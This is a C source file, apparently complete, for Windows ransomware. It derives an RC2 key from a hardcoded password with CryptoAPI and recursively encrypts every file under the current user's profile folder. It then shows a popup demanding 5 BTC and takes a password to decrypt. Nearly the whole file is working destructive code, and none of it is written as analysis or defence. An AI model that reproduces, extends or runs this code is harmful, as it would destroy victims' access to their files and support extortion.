// ransomware.c - Windows CryptoAPI (CAPI), NO external libs needed
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

// Global encryption context
HCRYPTPROV hProv = 0;
HCRYPTKEY hKey = 0;
HCRYPTHASH hHash = 0;

// Initialize CryptoAPI with password-derived key
BOOL init_crypto(const char* password) {
    if (!CryptAcquireContext(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) 
        return FALSE;
    
    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) return FALSE;
    if (!CryptHashData(hHash, (BYTE*)password, (DWORD)strlen(password), 0)) return FALSE;
    
    if (!CryptDeriveKey(hProv, CALG_RC2, hHash, 0, &hKey)) return FALSE;
    
    CryptDestroyHash(hHash); hHash = 0;
    return TRUE;
}

// Cleanup CryptoAPI
void cleanup_crypto() {
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
}

// Safe path join
int safe_path(char* dest, size_t size, const char* dir, const char* file) {
    return snprintf(dest, size, "%s\\%s", dir, file) < (int)size;
}

// ENCRYPT file using Windows CryptoAPI RC2
BOOL encrypt_file(const char* path) {
    HANDLE hFile = CreateFile(path, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD dwFileLen = GetFileSize(hFile, NULL);
    if (dwFileLen == INVALID_FILE_SIZE) { CloseHandle(hFile); return FALSE; }
    
    BYTE* buffer = (BYTE*)malloc(dwFileLen + 16);
    if (!buffer) { CloseHandle(hFile); return FALSE; }
    
    DWORD dwBytesRead;
    ReadFile(hFile, buffer, dwFileLen, &dwBytesRead, NULL);
    
    // PKCS7 padding
    DWORD padLen = 8 - (dwFileLen % 8);
    if (padLen == 0) padLen = 8;
    for (DWORD i = 0; i < padLen; i++) buffer[dwFileLen + i] = (BYTE)padLen;
    DWORD newLen = dwFileLen + padLen;
    
    DWORD dwDataLen = newLen;
    DWORD dwBufferLen = newLen + 16;
    
    if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer, &dwDataLen, dwBufferLen)) {
        free(buffer); CloseHandle(hFile); return FALSE;
    }
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD dwBytesWritten;
    WriteFile(hFile, buffer, dwDataLen, &dwBytesWritten, NULL);
    
    free(buffer); CloseHandle(hFile);
    return TRUE;
}

// DECRYPT file using Windows CryptoAPI RC2
BOOL decrypt_file(const char* path) {
    HANDLE hFile = CreateFile(path, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD dwFileLen = GetFileSize(hFile, NULL);
    if (dwFileLen == INVALID_FILE_SIZE) { CloseHandle(hFile); return FALSE; }
    
    BYTE* buffer = (BYTE*)malloc(dwFileLen);
    if (!buffer) { CloseHandle(hFile); return FALSE; }
    
    DWORD dwBytesRead;
    ReadFile(hFile, buffer, dwFileLen, &dwBytesRead, NULL);
    
    DWORD dwDataLen = dwFileLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, buffer, &dwDataLen)) {
        free(buffer); CloseHandle(hFile); return FALSE;
    }
    
    // Remove PKCS7 padding
    BYTE pad = buffer[dwDataLen - 1];
    if (pad <= 8) dwDataLen -= pad;
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD dwBytesWritten;
    WriteFile(hFile, buffer, dwDataLen, &dwBytesWritten, NULL);
    
    free(buffer); CloseHandle(hFile);
    return TRUE;
}

// Recursive encrypt ALL files FIRST
void encrypt_all(const char* root) {
    char pattern[MAX_PATH];
    safe_path(pattern, sizeof(pattern), root, "*");
    
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(pattern, &data);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) continue;
        
        char fullPath[MAX_PATH];
        if (!safe_path(fullPath, sizeof(fullPath), root, data.cFileName)) continue;
        
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_all(fullPath);
        } else if (encrypt_file(fullPath)) {
            printf("[+] Encrypted: %s\n", fullPath);
        }
    } while (FindNextFile(hFind, &data));
    
    FindClose(hFind);
}

// Recursive decrypt ALL files
void decrypt_all(const char* root) {
    char pattern[MAX_PATH];
    safe_path(pattern, sizeof(pattern), root, "*");
    
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(pattern, &data);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) continue;
        
        char fullPath[MAX_PATH];
        if (!safe_path(fullPath, sizeof(fullPath), root, data.cFileName)) continue;
        
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            decrypt_all(fullPath);
        } else if (decrypt_file(fullPath)) {
            printf("[+] Decrypted: %s\n", fullPath);
        }
    } while (FindNextFile(hFind, &data));
    
    FindClose(hFind);
}

int main() {
    // STEP 1: Generate secret key, ENCRYPT EVERYTHING FIRST
    char secret[] = "MySecretRansomKey1234567890";
    if (!init_crypto(secret)) {
        printf("[-] Crypto init failed\n");
        return 1;
    }
    
    // Target entire user directory
    char username[128] = {0}, target[MAX_PATH] = {0};
    DWORD len = sizeof(username);
    GetUserName(username, &len);
    snprintf(target, sizeof(target), "C:\\Users\\%s", username);
    
    printf("[*] Encrypting ALL files in %s...\n", target);
    encrypt_all(target);
    printf("[*] ENCRYPTION COMPLETE - Everything locked!\n");
    
    // STEP 2: Ransom demand popup (NO password prompt here)
    char msg[1024];
    snprintf(msg, sizeof(msg), 
        "ALL FILES IN C:\\Users\\%s ARE ENCRYPTED!\n\n"
        "Pay 5 BTC to 1RansomWallet123\n"
        "OR LOSE EVERYTHING FOREVER!\n\n"
        "Enter password below to unlock:", username);
    
    MessageBoxA(NULL, msg, "YOUR FILES ARE LOCKED!", MB_ICONSTOP | MB_OK);
    
    // STEP 3: Console password input for decryption
    char password[128] = {0};
    printf("\n[*] Waiting for ransom password...\n");
    printf("Enter password: ");
    
    int ch;
    int i = 0;
    while ((ch = getchar()) != '\n' && i < 127) {
        if (ch == '\b' && i > 0) i--;
        else password[i++] = (char)ch;
    }
    password[i] = 0;
    
    // STEP 4: Try to decrypt with entered password
    cleanup_crypto();
    if (!init_crypto(password)) {
        MessageBoxA(NULL, "WRONG PASSWORD! Files stay locked!", "ACCESS DENIED", MB_ICONERROR);
        return 1;
    }
    
    printf("[*] Attempting decryption...\n");
    decrypt_all(target);
    
    MessageBoxA(NULL, "Files UNLOCKED! (Don't get caught next time)", "Unlocked", MB_OK);
    cleanup_crypto();
    
    return 0;
}
